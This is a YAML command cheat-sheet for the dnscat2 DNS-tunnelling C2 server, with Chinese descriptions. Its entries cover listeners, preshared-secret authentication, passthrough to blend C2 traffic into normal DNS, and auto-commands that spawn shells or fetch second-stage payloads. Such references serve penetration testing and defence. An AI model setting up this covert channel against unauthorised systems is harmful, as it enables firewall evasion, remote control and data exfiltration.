tool: dnscat2-server
tags: [network, security, pentest, exfiltration, c2, dns]

actions:
# === BASIC OPERATION ===
 - title: dnscat2-server - 基本监听器
   desc: |
     在所有接口上使用默认 DNS 端口启动 dnscat2 服务器。
     当你没有注册域名用于递归隧道时，这是启动监听器的最简单方法，它期望直连服务器 IP，并需要 root 权限绑定 53 端口。
   command: "dnscat2-server"

 - title: dnscat2-server - 基于域名的监听器
   desc: |
     将服务器配置为处理特定权威域名的 DNS 请求。
     这是使用 dnscat2 进行递归 DNS 隧道的主要方式，可让流量经由合法 DNS 解析器绕过防火墙，你需确保该域名的 NS 记录指向服务器 IP。
   command: "dnscat2-server {{domain}}"

 - title: dnscat2-server - 自定义 DNS 配置
   desc: |
     使用 --dns 标志为 DNS 服务器指定自定义的 IP 地址和监听端口。
     当 53 端口已被占用，或服务器位于转发不同端口的负载均衡器或 NAT 之后时非常有用，参数以逗号分隔的键值对列表传入。
   command: "dnscat2-server --dns 'host={{listen_ip|0.0.0.0}},port={{listen_port|5353}},domain={{domain}}'"

# === SECURITY AND AUTHENTICATION ===
 - title: dnscat2-server - 认证服务器
   desc: |
     设置预共享密钥以启用认证并防止中间人（MITM）攻击。
     提供密钥后，服务器默认采用 authenticated 安全级别，要求客户端在建立会话前证明其知道该密钥，生产环境强烈建议使用以防止对 C2 服务器的未授权访问。
   command: "dnscat2-server --secret {{preshared_secret}} {{domain}}"

 - title: dnscat2-server - 强制安全级别
   desc: |
     显式设置安全级别，以定义如何处理加密和认证。
     选项包括 open（由客户端选择）、encrypted（要求加密）和 authenticated（要求加密及密钥），使用 authenticated 可确保只有你授权的客户端能与服务器通信。
   command: "dnscat2-server --security {{level|authenticated}} --secret {{preshared_secret}} {{domain}}"

# === ADVANCED TUNNELING ===
 - title: dnscat2-server - DNS 直通转发
   desc: |
     将未处理的 DNS 查询转发到上游 DNS 服务器。
     这让 dnscat2 服务器可充当目标的正常 DNS 解析器，将合法查询交给真正的 DNS 服务器，同时拦截 C2 流量，帮助 C2 流量混入正常网络活动。
   command: "dnscat2-server --passthrough {{upstream_dns|8.8.8.8:53}} {{domain}}"

 - title: dnscat2-server - 使用 auto-command 自动化
   desc: |
     对每个连接到服务器的客户端自动执行特定命令。
     对于生成 Shell 或无需人工交互即可下载次级载荷等即时后渗透操作非常有用，命令会在会话建立且客户端就绪后立即发送。
   command: "dnscat2-server --auto-command \"{{command|shell}}\" {{domain}}"

 - title: dnscat2-server - 自动附加会话
   desc: |
     自动将控制台附加到任何新创建的会话。
     默认情况下 dnscat2 会为每个会话创建新窗口，需要你手动切换，当你预期只有一个连接并希望立即交互时，此标志非常有用。
   command: "dnscat2-server --auto-attach {{domain}}"

# === DEBUGGING AND LOGGING ===
 - title: dnscat2-server - 数据包跟踪
   desc: |
     启用数据包跟踪，在终端中显示每个传入和传出的 dnscat 数据包。
     这是调试连接问题、协议错误或防火墙干扰的关键功能，但会产生大量输出，通常仅用于故障排查。
   command: "dnscat2-server --packet-trace {{domain}}"

 - title: dnscat2-server - firehose 输出
   desc: |
     将所有输出直接重定向到 stdout，而不是使用内部窗口系统。
     当你在另一个脚本中运行 dnscat2，或想通过标准 shell 重定向将所有活动记录到文件时非常有用，可移除交互式窗口管理以简化界面。
   command: "dnscat2-server --firehose {{domain}}"
